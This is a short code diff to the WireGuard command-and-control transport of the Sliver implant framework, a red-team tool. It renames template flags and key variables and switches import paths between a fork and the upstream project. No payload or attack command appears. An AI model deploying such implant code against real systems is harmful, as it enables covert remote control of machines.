@@ -20,7 +20,7 @@ package wireguard
 	along with this program.  If not, see <https://www.gnu.org/licenses/>.
 */
 
-// {{if .Config.IncludeWG}}
+// {{if .Config.WGc2Enabled}}
 
 import (
 	"bufio"
@@ -39,9 +39,9 @@ import (
 	"log"
 	// {{end}}
 
-	pb "github.com/starkzarn/glod/protobuf/sliverpb"
+	pb "github.com/bishopfox/sliver/protobuf/sliverpb"
 
-	"github.com/starkzarn/glod/implant/sliver/netstack"
+	"github.com/bishopfox/sliver/implant/sliver/netstack"
 	"golang.zx2c4.com/wireguard/conn"
 	"golang.zx2c4.com/wireguard/device"
 	"golang.zx2c4.com/wireguard/tun"
@@ -53,8 +53,8 @@ var (
 	tunnelNet   *netstack.Net
 	tunAddress  string
 
-	wgImplantPrivKey  = `{{.Build.WGImplantPrivKey}}`
-	wgServerPubKey    = `{{.Build.WGServerPubKey}}`
+	wgImplantPrivKey  = `{{.Config.WGImplantPrivKey}}`
+	wgServerPubKey    = `{{.Config.WGServerPubKey}}`
 	wgPeerTunIP       = `{{.Config.WGPeerTunIP}}`
 	wgKeyExchangePort = getWgKeyExchangePort()
 	wgTcpCommsPort    = getWgTcpCommsPort()
@@ -322,4 +322,4 @@ func getWgTcpCommsPort() int {
 	return wgTcpCommsPort
 }
 
-// {{end}} -IncludeWG
+// {{end}} -WGc2Enabled
